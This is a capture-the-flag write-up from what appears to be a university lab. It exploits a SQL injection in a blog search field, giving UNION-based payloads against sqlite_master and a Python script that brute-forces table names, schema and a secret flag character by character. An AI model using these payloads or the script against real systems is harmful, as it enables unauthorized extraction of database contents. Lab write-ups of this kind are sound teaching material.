# Challenge `Sometimes we are just temporarily blind` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to SQL injection

- Where: Where is the vulnerability present
  - `http://mustard.stt.rnl.tecnico.ulisboa.pt:23262`, on the search bar

- Impact: What results of exploiting this vulnerability
  - Allows the user to access hidden articles

## Steps to reproduce

1. Navigate to `http://mustard.stt.rnl.tecnico.ulisboa.pt:23262`
2. The seach executes the following query and is vulnerable to SQLi (discovered by inputting `'` with a random string following):

```sql
SELECT id, title, content FROM blog_post WHERE title LIKE '%<input>%' OR content LIKE '%input%' 
```

3. It is possible to view in the page how many returned from the query but not their content
4. We can brute-force a query like the one that follows, changing the values in the `LIKE` function in order to obtain the table names:

```SQL
' UNION SELECT tbl_name, tbl_name, tbl_name FROM sqlite_master WHERE tbl_name LIKE '<guess>%' --
```

5. A table named `super_s_sof_secrets` is found
6. We can brute-force another query to get the `CREATE` statement for this table (along with the column names):

```SQL
' UNION SELECT sql, tbl_name, tbl_name FROM sqlite_master WHERE type='table' AND name='super_s_sof_secrets' AND sql LIKE '<guess>%' --
```

7. A column named `secret` is found
8. Finally, we can get the flag by brute-forcing the final query:

```SQL
' UNION SELECT secret, secret ,secret FROM super_s_sof_secrets WHERE  secret LIKE '<guess>%' --
```

The code used was:

```py
import requests

# ' UNION SELECT tbl_name, tbl_name, tbl_name FROM sqlite_master -- 7 tabelas como no ultimo
# ' UNION SELECT tbl_name, tbl_name, tbl_name FROM secret_blog_post -- mas secret blog post mudou, ha uma tabela nova

def discover(base_url):
    valid_combinations = []
    valid_letters = 'abcdefghijklmnopqrstuvwxyz_'

    for letter in valid_letters:
        url = base_url.format(letter)
        res = requests.get(url)
        if '4' not in res.text:
            valid_combinations.append(letter)
            print(letter)

    result = ""
    while len(valid_combinations) != 0:
        new_valid_combinations = []
        for prefix in valid_combinations:
            for letter in valid_letters:
                url = base_url.format(prefix + letter)
                res = requests.get(url)
                if '4' not in res.text:
                    new_valid_combinations.append(prefix + letter)
                    result = prefix + letter
                    print(prefix + letter)
                    break
        valid_combinations = new_valid_combinations
    return result

# ' UNION SELECT tbl_name, tbl_name, tbl_name FROM sqlite_master WHERE tbl_name LIKE 'a%' --
base_url = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/?search=%27+UNION+SELECT+tbl_name%2C+tbl_name%2C+tbl_name+FROM+sqlite_master+WHERE+tbl_name+LIKE+%27{}%25%27+--"
table_name = discover(base_url)
print("Table name: " + table_name)

# ' UNION SELECT sql, tbl_name, tbl_name FROM sqlite_master WHERE type='table' AND name='super_s_sof_secrets' AND sql LIKE 'a%' --
base_url = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/?search=%27+UNION+SELECT+sql%2C+tbl_name%2C+tbl_name+FROM+sqlite_master+WHERE+type%3D%27table%27+AND+name%3D%27" + table_name + "%27+AND+sql+LIKE+%27{}%25%27+--"
create = discover(base_url)
print("Create statement: " + create)
column_name = "secret"

# ' UNION SELECT secret, secret ,secret FROM super_s_sof_secrets WHERE  secret LIKE 'a%' --
base_url = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/?search=%27+UNION+SELECT+secret%2C+secret+%2Csecret+FROM+" + table_name + "+WHERE++" + column_name + "+LIKE+%27{}%25%27+--+"
secret = discover(base_url)
print("Secret: " + secret)
```